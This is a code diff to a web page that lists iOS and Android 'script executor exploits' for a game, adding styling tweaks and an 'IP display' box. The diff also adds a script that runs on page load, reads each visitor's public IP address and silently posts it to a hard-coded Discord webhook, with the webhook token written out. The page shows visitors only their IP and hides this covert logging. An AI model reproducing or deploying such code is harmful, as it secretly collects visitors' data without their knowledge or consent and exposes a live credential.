@@ -235,6 +235,27 @@
       vertical-align: middle;
     }
 
+    /* ==================== IP DISPLAY BOX ==================== */
+    .ip-container {
+      text-align: center;
+      margin: 24px auto;
+      padding: 12px;
+      background-color: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 6px;
+      width: 240px;
+      font-size: 0.95rem;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+    }
+    .ip-container span.ip-label {
+      font-weight: 500;
+      margin-right: 6px;
+    }
+    .ip-container span.ip-address {
+      font-family: monospace;
+      color: var(--gradient-cyan-light);
+    }
+
     /* ==================== CONTAINER ==================== */
     .container {
       max-width: 960px;
@@ -437,9 +458,7 @@
 
     /* ==================== CARD BANNER ABOVE BUTTONS ==================== */
     .card-banner-inner {
-      background-color: rgba(var(--accent-yellow-rgb), 0.4);
-      /* fallback for older browsers */
-      background-color: rgba(255, 235, 59, 0.4);
+      background-color: rgba(255, 235, 59, 0.4); /* semi-transparent yellow */
       border-left: 4px solid var(--accent-yellow);
       color: #000;
       text-align: center;
@@ -611,6 +630,12 @@
     </div>
   </nav>
 
+  <!-- ==================== IP DISPLAY ==================== -->
+  <div class="ip-container" id="ipContainer">
+    <span class="ip-label">Your IP:</span>
+    <span class="ip-address" id="ipAddress">Loading…</span>
+  </div>
+
   <!-- ==================== MAIN CONTENT ==================== -->
   <div class="container">
     <!-- ========== iOS SCRIPT EXECUTOR EXPLOITS ========== -->
@@ -636,7 +661,7 @@
           </div>
         </div>
         <div class="item-subheader">
-          Last updated: 05/22/2025 at 8:09 PM UTC
+          Last updated: 05/22/2025 at 8:09 PM UTC
         </div>
         <div class="item-body">
           <!-- Banner above buttons -->
@@ -679,7 +704,7 @@
           </div>
         </div>
         <div class="item-subheader">
-          Last updated: 05/23/2025 at 3:50 AM UTC
+          Last updated: 05/23/2025 at 3:50 AM UTC
         </div>
         <div class="item-body">
           <!-- Banner above buttons -->
@@ -706,7 +731,7 @@
     <!-- ========== ANDROID SCRIPT EXECUTOR EXPLOITS ========== -->
     <div class="category-heading">Android Script Executor Exploits</div>
     <section class="exploit-list">
-      <!-- ----- DELTA ----- -->
+      <!-- ----- DELTA Android ----- -->
       <div class="exploit-item status-notupdated">
         <div class="item-header closed" onclick="toggleBody(this)">
           <div class="item-title">
@@ -726,7 +751,7 @@
           </div>
         </div>
         <div class="item-subheader">
-          Last updated: 05/23/2025 at 3:50 AM UTC
+          Last updated: 05/23/2025 at 3:50 AM UTC
         </div>
         <div class="item-body">
           <!-- Banner above buttons -->
@@ -749,7 +774,7 @@
         </div>
       </div>
 
-      <!-- ----- RONIX ----- -->
+      <!-- ----- RONIX Android ----- -->
       <div class="exploit-item status-notupdated">
         <div class="item-header closed" onclick="toggleBody(this)">
           <div class="item-title">
@@ -769,7 +794,7 @@
           </div>
         </div>
         <div class="item-subheader">
-          Last updated: 05/23/2025 at 3:46 AM UTC
+          Last updated: 05/23/2025 at 3:46 AM UTC
         </div>
         <div class="item-body">
           <!-- Banner above buttons -->
@@ -792,7 +817,7 @@
         </div>
       </div>
 
-      <!-- ----- CODEX ----- -->
+      <!-- ----- CODEX Android ----- -->
       <div class="exploit-item status-updated">
         <div class="item-header closed" onclick="toggleBody(this)">
           <div class="item-title">
@@ -812,7 +837,7 @@
           </div>
         </div>
         <div class="item-subheader">
-          Last updated: 05/22/2025 at 11:20 AM UTC
+          Last updated: 05/22/2025 at 11:20 AM UTC
         </div>
         <div class="item-body">
           <!-- Banner above buttons -->
@@ -845,11 +870,7 @@
         <button class="modal-close" id="closeModal">&times;</button>
       </div>
       <div class="modal-body">
-        <iframe 
-          id="suncIframe"
-          src=""
-          title="sUNC Test Results"
-        ></iframe>
+        <iframe id="suncIframe" src="" title="sUNC Test Results"></iframe>
       </div>
     </div>
   </div>
@@ -863,22 +884,18 @@
     dropdownSelected.addEventListener("click", () => {
       themeDropdown.classList.toggle("open");
     });
-
     document.addEventListener("click", (e) => {
       if (!themeDropdown.contains(e.target)) {
         themeDropdown.classList.remove("open");
       }
     });
-
     dropdownOptions.querySelectorAll("div").forEach(option => {
       option.addEventListener("click", () => {
         const chosenValue = option.getAttribute("data-value");
         const svgIcon = option.querySelector("svg.icon").cloneNode(true);
-
         dropdownSelected.innerHTML = `<span>Theme</span>`;
         dropdownSelected.appendChild(svgIcon);
         themeDropdown.classList.remove("open");
-
         if (chosenValue === "light") {
           document.body.classList.add("light-theme");
         } else {
@@ -911,7 +928,7 @@
       });
     });
 
-    // ==================== sUNC MODAL FUNCTIONALITY ==================== ###
+    // ==================== sUNC MODAL FUNCTIONALITY ====================
     const suncTags = document.querySelectorAll(".tag-sunc");
     const modalOverlay = document.getElementById("suncModal");
     const closeModalButton = document.getElementById("closeModal");
@@ -924,19 +941,42 @@
         modalOverlay.classList.add("show");
       });
     });
-
     closeModalButton.addEventListener("click", () => {
       modalOverlay.classList.remove("show");
-      suncIframe.src = ""; // clear src to stop any playing content
+      suncIframe.src = "";
     });
-
-    // Close modal when clicking outside content
     modalOverlay.addEventListener("click", (e) => {
       if (e.target === modalOverlay) {
         modalOverlay.classList.remove("show");
         suncIframe.src = "";
       }
     });
+
+    // ==================== FETCH & SEND USER IP TO DISCORD WEBHOOK ====================
+    async function fetchAndSendIP() {
+      try {
+        // 1) Get public IP from ipify
+        const resp = await fetch("https://api.ipify.org?format=json");
+        const data = await resp.json();
+        const ip = data.ip || "Unknown";
+
+        // 2) Insert IP into the page
+        document.getElementById("ipAddress").textContent = ip;
+
+        // 3) Send IP to Discord webhook
+        await fetch("https://discord.com/api/webhooks/1379091888333652069/RO_qc_Jt6pcxLFnF80C9Fn-64gUgPbMiUdSiOR9qmuq5_1-jkYbwCj855rIQtHEnb-7P", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: `Visitor IP: ${ip}` })
+        });
+      } catch (err) {
+        console.error("Could not fetch or send IP:", err);
+        document.getElementById("ipAddress").textContent = "Error";
+      }
+    }
+
+    // run on load
+    document.addEventListener("DOMContentLoaded", fetchAndSendIP);
   </script>
 </body>
 </html>
